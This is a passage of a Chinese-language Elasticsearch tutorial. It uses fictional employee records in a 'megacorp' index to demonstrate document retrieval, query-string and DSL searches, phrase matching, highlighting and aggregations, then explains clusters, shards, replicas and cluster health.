<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /megacorp/employee/2</span><br><span class="line">&#123;</span><br><span class="line">    "first_name" :  "Jane",</span><br><span class="line">    "last_name" :   "Smith",</span><br><span class="line">    "age" :         32,</span><br><span class="line">    "about" :       "I like to collect rock albums",</span><br><span class="line">    "interests":  [ "music" ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT /megacorp/employee/3</span><br><span class="line">&#123;</span><br><span class="line">    "first_name" :  "Douglas",</span><br><span class="line">    "last_name" :   "Fir",</span><br><span class="line">    "age" :         35,</span><br><span class="line">    "about":        "I like to build cabinets",</span><br><span class="line">    "interests":  [ "forestry" ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>检索文档</p>
<p>简单地执行 一个 HTTP GET 请求并指定文档的地址——索引库、类型和ID。 使用这三个信息可以返回原始的 JSON 文档：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /megacorp/employee/1</span><br></pre></td></tr></table></figure></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"_index"</span> :   <span class="string">"megacorp"</span>,</span><br><span class="line">  <span class="attr">"_type"</span> :    <span class="string">"employee"</span>,</span><br><span class="line">  <span class="attr">"_id"</span> :      <span class="string">"1"</span>,</span><br><span class="line">  <span class="attr">"_version"</span> : <span class="number">1</span>,</span><br><span class="line">  <span class="attr">"found"</span> :    <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"_source"</span> :  &#123;</span><br><span class="line">      <span class="attr">"first_name"</span> :  <span class="string">"John"</span>,</span><br><span class="line">      <span class="attr">"last_name"</span> :   <span class="string">"Smith"</span>,</span><br><span class="line">      <span class="attr">"age"</span> :         <span class="number">25</span>,</span><br><span class="line">      <span class="attr">"about"</span> :       <span class="string">"I love to go rock climbing"</span>,</span><br><span class="line">      <span class="attr">"interests"</span>:  [ <span class="string">"sports"</span>, <span class="string">"music"</span> ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>返回结果包含了文档的一些元数据，以及 _source 属性，内容是 John Smith 雇员的原始 JSON 文档。</p>
<p>将 HTTP 命令由 PUT 改为 GET 可以用来检索文档，同样的，可以使用 DELETE 命令来删除文档，以及使用 HEAD 指令来检查文档是否存在。如果想更新已存在的文档，只需再次 PUT 。</p>
<p>现在尝试点儿稍微高级的功能，比如一个简单的搜索！</p>
<p>我们使用下列请求来搜索所有雇员：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br></pre></td></tr></table></figure></p>
<p>可以看到，我们仍然使用索引库 megacorp 以及类型 employee<code>，但与指定一个文档 ID 不同，这次使用</code>_search 。返回结果包括了所有三个文档，放在数组 hits 中。一个搜索默认返回十条结果。<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"took"</span>:      <span class="number">6</span>,</span><br><span class="line">   <span class="attr">"timed_out"</span>: <span class="literal">false</span>,</span><br><span class="line">   "_shards": &#123; ... &#125;,</span><br><span class="line">   "hits": &#123;</span><br><span class="line">      "total":      3,</span><br><span class="line">      "max_score":  1,</span><br><span class="line">      "hits": [</span><br><span class="line">         &#123;</span><br><span class="line">            <span class="attr">"_index"</span>:         <span class="string">"megacorp"</span>,</span><br><span class="line">            <span class="attr">"_type"</span>:          <span class="string">"employee"</span>,</span><br><span class="line">            <span class="attr">"_id"</span>:            <span class="string">"3"</span>,</span><br><span class="line">            <span class="attr">"_score"</span>:         <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"_source"</span>: &#123;</span><br><span class="line">               <span class="attr">"first_name"</span>:  <span class="string">"Douglas"</span>,</span><br><span class="line">               <span class="attr">"last_name"</span>:   <span class="string">"Fir"</span>,</span><br><span class="line">               <span class="attr">"age"</span>:         <span class="number">35</span>,</span><br><span class="line">               <span class="attr">"about"</span>:       <span class="string">"I like to build cabinets"</span>,</span><br><span class="line">               <span class="attr">"interests"</span>: [ <span class="string">"forestry"</span> ]</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;,</span><br><span class="line">         &#123;</span><br><span class="line">            <span class="attr">"_index"</span>:         <span class="string">"megacorp"</span>,</span><br><span class="line">            <span class="attr">"_type"</span>:          <span class="string">"employee"</span>,</span><br><span class="line">            <span class="attr">"_id"</span>:            <span class="string">"1"</span>,</span><br><span class="line">            <span class="attr">"_score"</span>:         <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"_source"</span>: &#123;</span><br><span class="line">               <span class="attr">"first_name"</span>:  <span class="string">"John"</span>,</span><br><span class="line">               <span class="attr">"last_name"</span>:   <span class="string">"Smith"</span>,</span><br><span class="line">               <span class="attr">"age"</span>:         <span class="number">25</span>,</span><br><span class="line">               <span class="attr">"about"</span>:       <span class="string">"I love to go rock climbing"</span>,</span><br><span class="line">               <span class="attr">"interests"</span>: [ <span class="string">"sports"</span>, <span class="string">"music"</span> ]</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;,</span><br><span class="line">         &#123;</span><br><span class="line">            <span class="attr">"_index"</span>:         <span class="string">"megacorp"</span>,</span><br><span class="line">            <span class="attr">"_type"</span>:          <span class="string">"employee"</span>,</span><br><span class="line">            <span class="attr">"_id"</span>:            <span class="string">"2"</span>,</span><br><span class="line">            <span class="attr">"_score"</span>:         <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"_source"</span>: &#123;</span><br><span class="line">               <span class="attr">"first_name"</span>:  <span class="string">"Jane"</span>,</span><br><span class="line">               <span class="attr">"last_name"</span>:   <span class="string">"Smith"</span>,</span><br><span class="line">               <span class="attr">"age"</span>:         <span class="number">32</span>,</span><br><span class="line">               <span class="attr">"about"</span>:       <span class="string">"I like to collect rock albums"</span>,</span><br><span class="line">               <span class="attr">"interests"</span>: [ <span class="string">"music"</span> ]</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>尝试下搜索姓氏为 <code>Smith</code> 的雇员。为此，我们将使用一个 高亮 搜索，很容易通过命令行完成。这个方法一般涉及到一个 查询字符串 （<em>query-string</em>） 搜索，因为我们通过一个URL参数来传递查询信息给搜索接口：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /megacorp/employee/_search?q=last_name:Smith</span><br></pre></td></tr></table></figure></p>
<p>返回结果给出了所有的 Smith：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   ...</span><br><span class="line">   "hits": &#123;</span><br><span class="line">      "total":      2,</span><br><span class="line">      "max_score":  0.30685282,</span><br><span class="line">      "hits": [</span><br><span class="line">         &#123;</span><br><span class="line">            ...</span><br><span class="line">            "_source": &#123;</span><br><span class="line">               "first_name":  "John",</span><br><span class="line">               "last_name":   "Smith",</span><br><span class="line">               "age":         25,</span><br><span class="line">               "about":       "I love to go rock climbing",</span><br><span class="line">               "interests": [ "sports", "music" ]</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;,</span><br><span class="line">         &#123;</span><br><span class="line">            ...</span><br><span class="line">            "_source": &#123;</span><br><span class="line">               "first_name":  "Jane",</span><br><span class="line">               "last_name":   "Smith",</span><br><span class="line">               "age":         32,</span><br><span class="line">               "about":       "I like to collect rock albums",</span><br><span class="line">               "interests": [ "music" ]</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Query-string 搜索通过命令非常方便地进行临时性的即席搜索 ，但它有自身的局限性。Elasticsearch 提供一个丰富灵活的查询语言叫做 查询表达式 ， 它支持构建更加复杂和健壮的查询。<br>领域特定语言 （DSL）， 指定了使用一个 JSON 请求。我们可以像这样重写之前的查询所有 Smith 的搜索 ：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    "query" : &#123;</span><br><span class="line">        "match" : &#123;</span><br><span class="line">            "last_name" : "Smith"</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>现在尝试下更复杂的搜索<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    "query" : &#123;</span><br><span class="line">        "bool": &#123;</span><br><span class="line">            "must": &#123;</span><br><span class="line">                "match" : &#123;</span><br><span class="line">                    "last_name" : "smith" </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            "filter": &#123;</span><br><span class="line">                "range" : &#123;</span><br><span class="line">                    "age" : &#123; "gt" : 30 &#125; </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们添加了一个 过滤器 用于执行一个范围查询，并复用之前的 match 查询。现在结果只返回了一个雇员，叫 Jane Smith，32 岁。<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   ...</span><br><span class="line">   "hits": &#123;</span><br><span class="line">      "total":      1,</span><br><span class="line">      "max_score":  0.30685282,</span><br><span class="line">      "hits": [</span><br><span class="line">         &#123;</span><br><span class="line">            ...</span><br><span class="line">            "_source": &#123;</span><br><span class="line">               "first_name":  "Jane",</span><br><span class="line">               "last_name":   "Smith",</span><br><span class="line">               "age":         32,</span><br><span class="line">               "about":       "I like to collect rock albums",</span><br><span class="line">               "interests": [ "music" ]</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>现在尝试下稍微高级点儿的全文搜索——一项 传统数据库确实很难搞定的任务。<br>搜索下所有喜欢攀岩（rock climbing）的雇员：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    "query" : &#123;</span><br><span class="line">        "match" : &#123;</span><br><span class="line">            "about" : "rock climbing"</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>显然我们依旧使用之前的 match 查询在about 属性上搜索 “rock climbing” 。得到两个匹配的文档：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   ...</span><br><span class="line">   "hits": &#123;</span><br><span class="line">      "total":      2,</span><br><span class="line">      "max_score":  0.16273327,</span><br><span class="line">      "hits": [</span><br><span class="line">         &#123;</span><br><span class="line">            ...</span><br><span class="line">            "_score":         0.16273327, </span><br><span class="line">            "_source": &#123;</span><br><span class="line">               "first_name":  "John",</span><br><span class="line">               "last_name":   "Smith",</span><br><span class="line">               "age":         25,</span><br><span class="line">               "about":       "I love to go rock climbing",</span><br><span class="line">               "interests": [ "sports", "music" ]</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;,</span><br><span class="line">         &#123;</span><br><span class="line">            ...</span><br><span class="line">            "_score":         0.016878016, </span><br><span class="line">            "_source": &#123;</span><br><span class="line">               "first_name":  "Jane",</span><br><span class="line">               "last_name":   "Smith",</span><br><span class="line">               "age":         32,</span><br><span class="line">               "about":       "I like to collect rock albums",</span><br><span class="line">               "interests": [ "music" ]</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>相关性得分<br>Elasticsearch 默认按照相关性得分排序，即每个文档跟查询的匹配程度。第一个最高得分的结果很明显：John Smith 的 about 属性清楚地写着 “rock climbing” 。</p>
<p>但为什么 Jane Smith 也作为结果返回了呢？原因是她的 about 属性里提到了 “rock” 。因为只有 “rock” 而没有 “climbing” ，所以她的相关性得分低于 John 的。</p>
<p>短语搜索</p>
<p>有时候想要精确匹配一系列单词或者短语 。 比如， 我们想执行这样一个查询，仅匹配同时包含 “rock” 和 “climbing” ，并且 二者以短语 “rock climbing” 的形式紧挨着的雇员记录。这时候需要使用一个叫做 match_phrase 的查询：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    "query" : &#123;</span><br><span class="line">        "match_phrase" : &#123;</span><br><span class="line">            "about" : "rock climbing"</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>返回结果仅有 John Smith 的文档。<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   ...</span><br><span class="line">   "hits": &#123;</span><br><span class="line">      "total":      1,</span><br><span class="line">      "max_score":  0.23013961,</span><br><span class="line">      "hits": [</span><br><span class="line">         &#123;</span><br><span class="line">            ...</span><br><span class="line">            "_score":         0.23013961,</span><br><span class="line">            "_source": &#123;</span><br><span class="line">               "first_name":  "John",</span><br><span class="line">               "last_name":   "Smith",</span><br><span class="line">               "age":         25,</span><br><span class="line">               "about":       "I love to go rock climbing",</span><br><span class="line">               "interests": [ "sports", "music" ]</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>高亮搜索<br>再次执行前面的查询，并增加一个新的 highlight 参数：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    "query" : &#123;</span><br><span class="line">        "match_phrase" : &#123;</span><br><span class="line">            "about" : "rock climbing"</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    "highlight": &#123;</span><br><span class="line">        "fields" : &#123;</span><br><span class="line">            "about" : &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>结果中还多了一个叫做 highlight 的部分。这个部分包含了 about 属性匹配的文本片段，并以 HTML 标签 <em></em> 封装：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   ...</span><br><span class="line">   "hits": &#123;</span><br><span class="line">      "total":      1,</span><br><span class="line">      "max_score":  0.23013961,</span><br><span class="line">      "hits": [</span><br><span class="line">         &#123;</span><br><span class="line">            ...</span><br><span class="line">            "_score":         0.23013961,</span><br><span class="line">            "_source": &#123;</span><br><span class="line">               "first_name":  "John",</span><br><span class="line">               "last_name":   "Smith",</span><br><span class="line">               "age":         25,</span><br><span class="line">               "about":       "I love to go rock climbing",</span><br><span class="line">               "interests": [ "sports", "music" ]</span><br><span class="line">            &#125;,</span><br><span class="line">            "highlight": &#123;</span><br><span class="line">               "about": [</span><br><span class="line">                  <span class="string">"I love to go &lt;em&gt;rock&lt;/em&gt; &lt;em&gt;climbing&lt;/em&gt;"</span> </span><br><span class="line">               ]</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>分析<br>Elasticsearch 有一个功能叫聚合（aggregations），允许我们基于数据生成一些精细的分析结果。聚合与 SQL 中的 GROUP BY 类似但更强大。<br>举个例子，挖掘出雇员中最受欢迎的兴趣爱好：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">  "aggs": &#123;</span><br><span class="line">    "all_interests": &#123;</span><br><span class="line">      "terms": &#123; "field": "interests" &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>看看结果：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   ...</span><br><span class="line">   "hits": &#123; ... &#125;,</span><br><span class="line">   "aggregations": &#123;</span><br><span class="line">      "all_interests": &#123;</span><br><span class="line">         "buckets": [</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="attr">"key"</span>:       <span class="string">"music"</span>,</span><br><span class="line">               <span class="attr">"doc_count"</span>: <span class="number">2</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="attr">"key"</span>:       <span class="string">"forestry"</span>,</span><br><span class="line">               <span class="attr">"doc_count"</span>: <span class="number">1</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="attr">"key"</span>:       <span class="string">"sports"</span>,</span><br><span class="line">               <span class="attr">"doc_count"</span>: <span class="number">1</span></span><br><span class="line">            &#125;</span><br><span class="line">         ]</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这些聚合并非预先统计，而是从匹配当前查询的文档中即时生成。如果想知道叫 Smith 的雇员中最受欢迎的兴趣爱好，可以直接添加适当的查询来组合查询：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">  "query": &#123;</span><br><span class="line">    "match": &#123;</span><br><span class="line">      "last_name": "smith"</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  "aggs": &#123;</span><br><span class="line">    "all_interests": &#123;</span><br><span class="line">      "terms": &#123;</span><br><span class="line">        "field": "interests"</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>all_interests 聚合已经变为只包含匹配查询的文档：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">"all_interests": &#123;</span><br><span class="line">   "buckets": [</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="attr">"key"</span>: <span class="string">"music"</span>,</span><br><span class="line">         <span class="attr">"doc_count"</span>: <span class="number">2</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="attr">"key"</span>: <span class="string">"sports"</span>,</span><br><span class="line">         <span class="attr">"doc_count"</span>: <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>聚合还支持分级汇总 。比如，查询特定兴趣爱好员工的平均年龄：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    "aggs" : &#123;</span><br><span class="line">        "all_interests" : &#123;</span><br><span class="line">            "terms" : &#123; "field" : "interests" &#125;,</span><br><span class="line">            "aggs" : &#123;</span><br><span class="line">                "avg_age" : &#123;</span><br><span class="line">                    "avg" : &#123; "field" : "age" &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>得到的聚合结果有点儿复杂，但理解起来还是很简单的：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">"all_interests": &#123;</span><br><span class="line">   "buckets": [</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="attr">"key"</span>: <span class="string">"music"</span>,</span><br><span class="line">         <span class="attr">"doc_count"</span>: <span class="number">2</span>,</span><br><span class="line">         <span class="attr">"avg_age"</span>: &#123;</span><br><span class="line">            <span class="attr">"value"</span>: <span class="number">28.5</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="attr">"key"</span>: <span class="string">"forestry"</span>,</span><br><span class="line">         <span class="attr">"doc_count"</span>: <span class="number">1</span>,</span><br><span class="line">         <span class="attr">"avg_age"</span>: &#123;</span><br><span class="line">            <span class="attr">"value"</span>: <span class="number">35</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="attr">"key"</span>: <span class="string">"sports"</span>,</span><br><span class="line">         <span class="attr">"doc_count"</span>: <span class="number">1</span>,</span><br><span class="line">         <span class="attr">"avg_age"</span>: &#123;</span><br><span class="line">            <span class="attr">"value"</span>: <span class="number">25</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>输出基本是第一次聚合的加强版。依然有一个兴趣及数量的列表，只不过每个兴趣都有了一个附加的 avg_age 属性，代表有这个兴趣爱好的所有员工的平均年龄。</p>
<h2 id="分布式特性"><a href="#分布式特性" class="headerlink" title="分布式特性"></a>分布式特性</h2><p>我们提到过 Elasticsearch 可以横向扩展至数百（甚至数千）的服务器节点，同时可以处理PB级数据。我们的教程给出了一些使用 Elasticsearch 的示例，但并不涉及任何内部机制。Elasticsearch 天生就是分布式的，并且在设计时屏蔽了分布式的复杂性。</p>
<p>Elasticsearch 尽可能地屏蔽了分布式系统的复杂性。这里列举了一些在后台自动执行的操作：</p>
<p>1.分配文档到不同的容器 或 分片 中，文档可以储存在一个或多个节点中<br>2.按集群节点来均衡分配这些分片，从而对索引和搜索过程进行负载均衡<br>3.复制每个分片以支持数据冗余，从而防止硬件故障导致的数据丢失<br>4.将集群中任一节点的请求路由到存有相关数据的节点<br>5.集群扩容时无缝整合新节点，重新分配分片以便从离群节点恢复</p>
<h2 id="集群内的原理"><a href="#集群内的原理" class="headerlink" title="集群内的原理"></a>集群内的原理</h2><p>ElasticSearch 的主旨是随时可用和按需扩容。 而扩容可以通过购买性能更强大（ 垂直扩容 ，或 纵向扩容 ） 或者数量更多的服务器（ 水平扩容 ，或 横向扩容 ）来实现。</p>
<p>虽然 Elasticsearch 可以获益于更强大的硬件设备，但是垂直扩容是有极限的。 真正的扩容能力是来自于水平扩容–为集群添加更多的节点，并且将负载压力和稳定性分散到这些节点中。</p>
<p>对于大多数的数据库而言，通常需要对应用程序进行非常大的改动，才能利用上横向扩容的新增资源。 与之相反的是，ElastiSearch天生就是 分布式的 ，它知道如何通过管理多节点来提高扩容性和可用性。 这也意味着你的应用无需关注这个问题。</p>
<h2 id="空集群"><a href="#空集群" class="headerlink" title="空集群"></a>空集群</h2><p>如果我们启动了一个单独的节点，里面不包含任何的数据和 索引，那我们的集群看起来就是一个 Figure 1, “包含空内容节点的集群”。</p>
<p><img src="https://mfaying.github.io/images/elasticsearch2.x/1.jpg" alt="avatar"><br>(图)包含空内容节点的集群</p>
<p>一个运行中的 Elasticsearch 实例称为一个 节点，而集群是由一个或者多个拥有相同 cluster.name 配置的节点组成， 它们共同承担数据和负载的压力。当有节点加入集群中或者从集群中移除节点时，集群将会重新平均分布所有的数据。</p>
<p>当一个节点被选举成为 主 节点时， 它将负责管理集群范围内的所有变更，例如增加、删除索引，或者增加、删除节点等。 而主节点并不需要涉及到文档级别的变更和搜索等操作，所以当集群只拥有一个主节点的情况下，即使流量的增加它也不会成为瓶颈。 任何节点都可以成为主节点。我们的示例集群就只有一个节点，所以它同时也成为了主节点。</p>
<p>作为用户，我们可以将请求发送到 集群中的任何节点 ，包括主节点。 每个节点都知道任意文档所处的位置，并且能够将我们的请求直接转发到存储我们所需文档的节点。 无论我们将请求发送到哪个节点，它都能负责从各个包含我们所需文档的节点收集回数据，并将最终结果返回給客户端。</p>
<h2 id="集群健康"><a href="#集群健康" class="headerlink" title="集群健康"></a>集群健康</h2><p>Elasticsearch 的集群监控信息中包含了许多的统计数据，其中最为重要的一项就是 集群健康 ， 它在 status 字段中展示为 green 、 yellow 或者 red 。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_cluster/health</span><br></pre></td></tr></table></figure></p>
<p>在一个不包含任何索引的空集群中，它将会有一个类似于如下所示的返回内容：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"cluster_name"</span>:          <span class="string">"elasticsearch"</span>,</span><br><span class="line">   <span class="attr">"status"</span>:                <span class="string">"green"</span>, </span><br><span class="line">   <span class="attr">"timed_out"</span>:             <span class="literal">false</span>,</span><br><span class="line">   <span class="attr">"number_of_nodes"</span>:       <span class="number">1</span>,</span><br><span class="line">   <span class="attr">"number_of_data_nodes"</span>:  <span class="number">1</span>,</span><br><span class="line">   <span class="attr">"active_primary_shards"</span>: <span class="number">0</span>,</span><br><span class="line">   <span class="attr">"active_shards"</span>:         <span class="number">0</span>,</span><br><span class="line">   <span class="attr">"relocating_shards"</span>:     <span class="number">0</span>,</span><br><span class="line">   <span class="attr">"initializing_shards"</span>:   <span class="number">0</span>,</span><br><span class="line">   <span class="attr">"unassigned_shards"</span>:     <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>status 字段是我们最关心的。status 字段指示着当前集群在总体上是否工作正常。它的三种颜色含义如下：</p>
<p>1.green 所有的主分片和副本分片都正常运行。<br>2.yellow 所有的主分片都正常运行，但不是所有的副本分片都正常运行。<br>3.red 有主分片没能正常运行。</p>
<h2 id="添加索引"><a href="#添加索引" class="headerlink" title="添加索引"></a>添加索引</h2><p>我们往 Elasticsearch 添加数据时需要用到 索引 —— 保存相关数据的地方。 索引实际上是指向一个或者多个物理 分片 的 逻辑命名空间 。</p>
<p>一个 分片 是一个底层的 工作单元 ，它仅保存了 全部数据中的一部分。一个分片是一个 Lucene 的实例，以及它本身就是一个完整的搜索引擎。 我们的文档被存储和索引到分片内，但是应用程序是直接与索引而不是与分片进行交互。</p>
<p>Elasticsearch 是利用分片将数据分发到集群内各处的。分片是数据的容器，文档保存在分片内，分片又被分配到集群内的各个节点里。 当你的集群规模扩大或者缩小时， Elasticsearch 会自动的在各节点中迁移分片，使得数据仍然均匀分布在集群里。</p>
<p>一个分片可以是 主 分片或者 副本 分片。 索引内任意一个文档都归属于一个主分片，所以主分片的数目决定着索引能够保存的最大数据量。</p>
<p>技术上来说，一个主分片最大能够存储 Integer.MAX_VALUE - 128 个文档，但是实际最大值还需要参考你的使用场景：包括你使用的硬件， 文档的大小和复杂程度，索引和查询文档的方式以及你期望的响应时长。</p>
<p>一个副本分片只是一个主分片的拷贝。 副本分片作为硬件故障时保护数据不丢失的冗余备份，并为搜索和返回文档等读操作提供服务。</p>
<p>在索引建立的时候就已经确定了主分片数，但是副本分片数可以随时修改。</p>
<p>让我们在包含一个空节点的集群内创建名为 blogs 的索引。 索引在默认情况下会被分配5个主分片， 但是为了演示目的，我们将分配3个主分片和一份副本（每个主分片拥有一个副本分片）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /blogs</span><br><span class="line">&#123;</span><br><span class="line">   "settings" : &#123;</span><br><span class="line">      "number_of_shards" : 3,</span><br><span class="line">      "number_of_replicas" : 1</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们的集群现在是Figure 2, “拥有一个索引的单节点集群”。所有3个主分片都被分配在 Node 1 。<br><img src="https://mfaying.github.io/images/elasticsearch2.x/2.jpg" alt="avatar"><br>(图)拥有一个索引的单节点集群</p>
<p>我们现在查看集群健康：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"cluster_name"</span>: <span class="string">"elasticsearch"</span>,</span><br><span class="line">  <span class="attr">"status"</span>: <span class="string">"yellow"</span>, </span><br><span class="line">  <span class="attr">"timed_out"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"number_of_nodes"</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">"number_of_data_nodes"</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">"active_primary_shards"</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="attr">"active_shards"</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="attr">"relocating_shards"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"initializing_shards"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"unassigned_shards"</span>: <span class="number">3</span>, </span><br><span class="line">  <span class="attr">"delayed_unassigned_shards"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"number_of_pending_tasks"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"number_of_in_flight_fetch"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"task_max_waiting_in_queue_millis"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"active_shards_percent_as_number"</span>: <span class="number">50</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>“status”: “yellow” -&gt; 集群 status 值为 yellow 。<br>“unassigned_shards”: 3 -&gt; 没有被分配到任何节点的副本数。</p>
<p>集群的健康状况为 yellow 则表示全部 主 分片都正常运行（集群可以正常服务所有请求），但是 副本 分片没有全部处在正常状态。 实际上，所有3个副本分片都是 unassigned —— 它们都没有被分配到任何节点。 在同一个节点上既保存原始数据又保存副本是没有意义的，因为一旦失去了那个节点，我们也将丢失该节点上的所有副本数据。</p>
<h2 id="添加故障转移"><a href="#添加故障转移" class="headerlink" title="添加故障转移"></a>添加故障转移</h2><p>启动第二个节点</p>
<p>你可以在同一个目录内，完全依照启动第一个节点的方式来启动一个新节点（参考安装并运行 Elasticsearch）。多个节点可以共享同一个目录。</p>
